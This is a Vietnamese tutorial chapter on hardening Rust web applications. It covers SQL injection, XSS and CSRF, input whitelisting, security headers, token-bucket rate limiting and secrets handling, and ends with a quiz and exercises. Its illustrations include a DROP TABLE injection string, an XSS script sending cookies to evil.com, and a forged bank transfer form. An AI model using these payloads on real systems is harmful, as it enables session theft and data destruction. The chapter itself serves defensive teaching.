# Chapter 41 — Application Security & Hardening

> **Bạn sẽ học được**:
> - Hiểu sâu sắc và phòng chống 3 lỗ hổng kinh điển: SQL Injection, XSS, và CSRF.
> - Tư duy **Phòng thủ chiều sâu (Defense in Depth)** thông qua Input Validation bằng Whitelist.
> - Cấu hình Security Headers để biến trình duyệt thành lá chắn bảo vệ.
> - Áp dụng các thuật toán Rate Limiting (Token Bucket, Sliding Window) chống lại DDoS và Brute-force.
> - Quản lý Secret đúng chuẩn Production, tuyệt đối không hardcode.
>
> **Yêu cầu trước**: Chapter 40 (Security Essentials).
> **Thời gian đọc**: ~40 phút | **Level**: Principal
> **Kết quả cuối cùng**: Biết cách thiết lập các chốt chặn an ninh cho ứng dụng Web, biến nó thành một pháo đài bất khả xâm phạm trước các kịch bản tấn công OWASP Top 10.

---

Bảo mật không phải là một chức năng (feature) bạn có thể "thêm vào sau". Nếu bạn nghĩ "để code chạy trước, bảo mật tính sau", ứng dụng của bạn chắc chắn sẽ bị hack trong vòng 24 giờ kể từ lúc đưa lên mạng.
Rust đã làm rất tốt việc bảo vệ bạn khỏi các lỗi truy cập bộ nhớ (Buffer Overflow, Use-after-free). Nhưng Rust không thể ngăn bạn viết một câu SQL chứa mã độc, hoặc in ra một đoạn HTML chứa mã JavaScript ăn cắp Cookie.

Trong chương này, chúng ta sẽ xây dựng các lớp phòng thủ (Hardening) để chống lại các lỗ hổng kinh điển trong **OWASP Top 10**.

## 41.1 — 3 Hố tử thần: SQLi, XSS, và CSRF

### 1. SQL Injection (Mã độc Cơ sở dữ liệu)
Hãy nhìn hàm dưới đây:
```rust
fn find_user_bad(email: &str) -> String {
    // ❌ LỖ HỔNG CHẾT NGƯỜI: Nối chuỗi (String Interpolation) trực tiếp vào SQL
    format!("SELECT * FROM users WHERE email = '{}'", email)
}
```
Nếu kẻ tấn công nhập email là: `'; DROP TABLE users; --`
Câu SQL sẽ biến thành: `SELECT * FROM users WHERE email = ''; DROP TABLE users; --'`. Bảng Users của bạn bay màu ngay lập tức!

**✅ Cách phòng thủ duy nhất**: Luôn dùng **Parameterized Queries** (Truy vấn có tham số).
Khi dùng Parameterized Queries, Database Engine sẽ hiểu biến truyền vào CHỈ LÀ CHUỖI VĂN BẢN (Text), tuyệt đối không bao giờ được biên dịch thành lệnh SQL.

### 2. XSS (Cross-Site Scripting)
XSS xảy ra khi bạn lấy nội dung do người dùng nhập vào và in thẳng ra màn hình HTML mà không lọc.
Kẻ tấn công có thể bình luận một đoạn mã JavaScript: `<script>fetch('https://evil.com?cookie=' + document.cookie)</script>`.
Bất kỳ ai vào đọc bình luận đó, trình duyệt của họ sẽ chạy ngầm đoạn mã JS kia và gửi Cookie (Session đăng nhập) cho hacker.

**✅ Cách phòng thủ**: Luôn **HTML Escape** mọi dữ liệu trước khi render (Biến `<` thành `&lt;`, `>` thành `&gt;`). Đa số các Web Framework hiện đại (như Tera, Askama trong Rust, hay React/Vue) đều tự động làm việc này.

### 3. CSRF (Cross-Site Request Forgery)
Bạn đang đăng nhập ở ngân hàng `bank.com`. Sau đó bạn mở 1 tab khác để xem phim lậu ở `evil.com`.
Trên `evil.com`, kẻ tấn công nhúng 1 cái form ẩn: `<form action="https://bank.com/transfer" method="POST">` và tự động kích hoạt.
Trình duyệt của bạn sẽ tự động đính kèm Cookie đăng nhập của `bank.com` vào request đó! Ngân hàng tưởng chính bạn đang thao tác, và tiền của bạn "không cánh mà bay".

**✅ Cách phòng thủ**: 
- Dùng **CSRF Token**: Một chuỗi ngẫu nhiên sinh ra cho mỗi session và bắt buộc phải gửi kèm trong Form Body. `evil.com` không thể đọc được Token này để giả mạo Form.
- Set Cookie attribute: `SameSite=Strict`. Trình duyệt sẽ từ chối gửi Cookie nếu request bắt nguồn từ một domain khác (`evil.com`).

---

## 41.2 — Input Validation (Chỉ tin những gì mình biết)

Quy tắc tối thượng: **Tuyệt đối không tin tưởng bất kỳ dữ liệu nào đến từ Client**.

Nhiều lập trình viên dùng chiến lược **Blacklist** (Danh sách đen): "Nếu chuỗi chứa `<script>` thì cấm". Đây là chiến lược thảm họa, vì hacker có hàng ngàn cách viết khác nhau (như `%3Cscript%3E` hay viết hoa `<sCrIpT>`).

Hãy luôn dùng **Whitelist** (Danh sách trắng): Chỉ cho phép những gì bạn biết chắc là an toàn.

```rust
// ✅ Whitelist: Chỉ cho phép chữ cái, số, và dấu gạch dưới. Giới hạn độ dài 3-30.
fn validate_username(input: &str) -> Result<String, String> {
    let trimmed = input.trim();
    if trimmed.len() < 3 || trimmed.len() > 30 {
        return Err("Username phải từ 3-30 ký tự".into());
    }
    
    // Nếu có 1 ký tự nào KHÔNG nằm trong danh sách trắng, lập tức reject!
    if !trimmed.chars().all(|c| c.is_alphanumeric() || c == '_') {
        return Err("Username chỉ được chứa chữ, số, và dấu _".into());
    }
    
    Ok(trimmed.to_string())
}
```
Trong hệ sinh thái Functional Programming (Chương 24 - ROP), Input Validation chính là cửa ngõ để biến các Dữ liệu Thô (Raw Data) thành Dữ liệu Đã Kiểm Trị (Validated Data/Newtypes).

---

## 41.3 — Security Headers: Bật khiên Trình duyệt

Khi một trình duyệt tải trang web của bạn, bạn có thể gửi kèm các **HTTP Headers** để ra lệnh cho trình duyệt bật các cơ chế phòng vệ nghiêm ngặt nhất. Bạn có thể chèn các Header này thông qua Middleware của Axum hoặc Actix-web.

| HTTP Header | Ý nghĩa / Tác dụng bảo vệ | Giá trị khuyên dùng |
|-------------|-------------------------|---------------------|
| `Content-Security-Policy` (CSP) | Trình duyệt chỉ được chạy JS/CSS tải từ chính domain của bạn. Khóa mõm hoàn toàn mã độc XSS. | `default-src 'self'` |
| `Strict-Transport-Security` (HSTS) | Ép buộc trình duyệt chỉ dùng HTTPS trong vòng 1 năm tới, chống lại các đòn tấn công hạ cấp (Downgrade attack). | `max-age=31536000; includeSubDomains` |
| `X-Frame-Options` | Cấm các trang web khác nhúng trang của bạn vào thẻ `<iframe>`. Chống tấn công Clickjacking. | `DENY` |
| `X-Content-Type-Options` | Cấm trình duyệt tự suy đoán kiểu tệp (MIME Sniffing), chống lại việc hacker tải lên ảnh nhưng lén chứa mã JS. | `nosniff` |

---

## 41.4 — Rate Limiting: Chống Brute-force và DDoS

Nếu trang Login của bạn không có giới hạn, hacker sẽ viết tool gõ 10,000 mật khẩu khác nhau trong 1 phút để dò mật khẩu. Bạn phải giới hạn tốc độ (Rate Limiting) trên mỗi IP hoặc mỗi User.

Một trong những thuật toán nổi tiếng nhất là **Token Bucket** (Xô chứa Token). 
- Hãy tưởng tượng bạn có 1 cái xô chứa được tối đa 10 cái Token.
- Cứ mỗi giây, hệ thống nhỏ giọt thêm 2 Token vào xô.
- Mỗi lần User gửi Request, họ phải lấy 1 Token ra khỏi xô.
- Nếu xô rỗng, Request bị từ chối (`429 Too Many Requests`).

Thuật toán này cực kỳ hay vì nó cho phép **Bursts** (Bùng nổ tức thời): User có thể click 10 lần trong 1 giây (nhờ 10 token có sẵn), nhưng sau đó sẽ phải chờ (vì tốc độ hồi phục chỉ là 2 token/giây).

```rust
// Thuật toán Token Bucket (Đơn giản hóa để minh họa)
struct TokenBucket {
    capacity: f64,
    tokens: f64,
    refill_rate_per_sec: f64,
    last_refill: std::time::Instant,
}

impl TokenBucket {
    fn allow_request(&mut self) -> bool {
        let now = std::time::Instant::now();
        let elapsed_secs = now.duration_since(self.last_refill).as_secs_f64();
        
        // Hồi phục token theo thời gian đã trôi qua
        self.tokens = (self.tokens + elapsed_secs * self.refill_rate_per_sec).min(self.capacity);
        self.last_refill = now;

        if self.tokens >= 1.0 {
            self.tokens -= 1.0;
            true // Đủ token -> Cho phép!
        } else {
            false // Rỗng xô -> Từ chối!
        }
    }
}
```
*Lưu ý: Trong Production, Token Bucket sẽ được lưu trên Redis (bằng LUA script) để share cho nhiều Servers.*

---

## 41.5 — Quản lý Secrets (Bí mật)

**Tuyệt đối KHÔNG BAO GIỜ hardcode Mật khẩu DB hay API Key trong Source code!**
Nếu bạn hardcode và đẩy lên Github, các bot dò quét sẽ tìm thấy nó trong vòng 3 giây và hệ thống của bạn sẽ bốc hơi.

Quy tắc quản lý Secrets chuẩn Production:
1. Ở môi trường Dev (Máy cá nhân): Lưu bí mật trong file `.env`. Đảm bảo `.env` đã được liệt kê trong `.gitignore`.
2. Ở môi trường Production: Bơm bí mật vào ứng dụng thông qua **Environment Variables** (Biến môi trường) khi khởi chạy container Docker.
3. Ở các hệ thống cực lớn: Sử dụng các dịch vụ Secret Manager chuyên dụng (như AWS Secrets Manager hoặc HashiCorp Vault). Ứng dụng sẽ gọi API để mượn chìa khóa tạm thời.

---

## ✅ Checkpoint 41

1. `sqlx` tham số hoá query. Vẫn còn cách nào dính SQL injection không?
2. Vì sao CORS không phải là biện pháp bảo mật cho API?
3. `rustls` so với OpenSSL — lợi ích về mặt an toàn bộ nhớ là gì?

<details>
<summary>Đáp án</summary>

1. Có: `format!("SELECT * FROM {table}")` cho tên bảng/cột động — thứ không tham số hoá được. Phải whitelist danh sách tên hợp lệ.
2. Vì CORS chỉ ràng buộc trình duyệt. `curl` bỏ qua nó hoàn toàn. CORS bảo vệ người dùng của bạn khỏi trang web khác, không bảo vệ API của bạn khỏi kẻ tấn công.
3. `rustls` viết bằng Rust an toàn, nên cả lớp lỗi tràn bộ đệm (kiểu Heartbleed) là bất khả thi về mặt cấu trúc. OpenSSL là C, và lịch sử CVE của nó phần lớn là lỗi bộ nhớ.
</details>

---

## 🏋️ Bài tập

**Bài 1 (10 phút).** Viết handler Axum **cố tình** nối chuỗi query, khai thác nó, rồi sửa bằng `sqlx::query!`.

**Bài 2 (15 phút).** Thêm middleware security header cho Axum (`tower-http::set_header`): CSP, HSTS, X-Frame-Options, X-Content-Type-Options.

**Bài 3 (25 phút).** Cài rate limit token-bucket bằng `tower::limit` hoặc tự viết middleware. Giới hạn theo IP **và** theo user để chặn credential stuffing.

---

## 🔧 Troubleshooting

| Vấn đề | Vì sao xảy ra | Hướng xử lý |
|---|---|---|
| CORS lỗi dù đã thêm layer | Chưa xử lý preflight `OPTIONS` | `CorsLayer` phải cho phép method và header tương ứng |
| `unsafe` xuất hiện trong dependency | Crate nền tảng có FFI | `cargo geiger` để soi; ưu tiên crate pure-Rust |
| Sau reverse proxy mọi request cùng IP | Không đọc `X-Forwarded-For` | Dùng `axum-client-ip` với cấu hình proxy tin cậy |
| Panic trong handler làm sập cả server | Không có catch panic | Thêm `tower_http::catch_panic::CatchPanicLayer` |
| Thông báo lỗi lộ chi tiết nội bộ | `impl IntoResponse` trả nguyên lỗi gốc | Log chi tiết ở server, trả về client thông điệp chung |

## Tóm tắt

- ✅ **SQL Injection**: Luôn luôn, LUÔN LUÔN dùng Parameterized Queries. Không bao giờ nối chuỗi SQL.
- ✅ **Input Validation**: Dùng Whitelist. Coi mọi input từ bên ngoài là nguy hiểm chết người.
- ✅ **Security Headers**: Trang bị CSP, HSTS, X-Frame-Options để biến trình duyệt thành lá chắn.
- ✅ **Rate Limiting**: Triển khai thuật toán Token Bucket / Sliding Window trên Redis để bảo vệ các Endpoints nhạy cảm (Đặc biệt là tính năng Đăng nhập/Đăng ký).
- ✅ **Secrets Management**: Source Code nằm trên Github phải đảm bảo An toàn ngay cả khi nó ở chế độ Public. Mã nguồn mở không được chứa API Keys.

## Tiếp theo

Đến đây, Hệ thống của bạn đã thực sự vững vàng. Từ thiết kế Functional Architecture, Database an toàn, Caching tốc độ cao, và Bảo mật đa lớp. 
Đã đến lúc chúng ta tìm hiểu xem làm sao để vận hành nó trơn tru trong thực tế: Các hệ thống phân tán, Monitoring, và DevOps Workflow trong **Chapter 42: Distributed Systems Fundamentals**.
